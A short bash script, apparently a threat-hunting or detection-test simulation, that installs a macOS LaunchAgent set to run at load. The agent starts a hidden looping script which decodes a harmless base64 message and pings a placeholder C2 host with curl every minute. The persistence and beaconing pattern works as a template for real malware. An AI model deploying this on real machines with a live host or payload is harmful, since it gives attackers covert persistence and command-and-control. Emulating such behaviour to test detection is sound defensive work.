#!/bin/bash
# create_agent_c2.sh - Creates a LaunchAgent with base64 payload and pingback

AGENT_PATH="$HOME/Library/LaunchAgents/com.verysafe.c2agent.plist"
PAYLOAD_SCRIPT="$HOME/.safepayload.sh"

# Write payload script
cat << 'EOF' > $PAYLOAD_SCRIPT
#!/bin/bash
while true; do
    # Decode the base64 argument and print it
    MSG=$(echo $1 | base64 --decode)
    echo "[Agent] Payload says: $MSG"

    # Simulate C2 pingback
    curl -s -o /dev/null http://c2.fake-server.local/ping
    sleep 60
done
EOF
chmod +x $PAYLOAD_SCRIPT

# Base64 payload
ENCODED_PAYLOAD=$(echo -n "Good Hunting!" | base64)

# Create LaunchAgent plist
cat <<EOF > $AGENT_PATH
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" 
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key><string>com.verysafe.c2agent</string>
    <key>ProgramArguments</key>
    <array>
        <string>$PAYLOAD_SCRIPT</string>
        <string>$ENCODED_PAYLOAD</string>
    </array>
    <key>RunAtLoad</key><true/>
</dict>
</plist>
EOF

# Load the agent
launchctl bootstrap gui/$(id -u) $AGENT_PATH
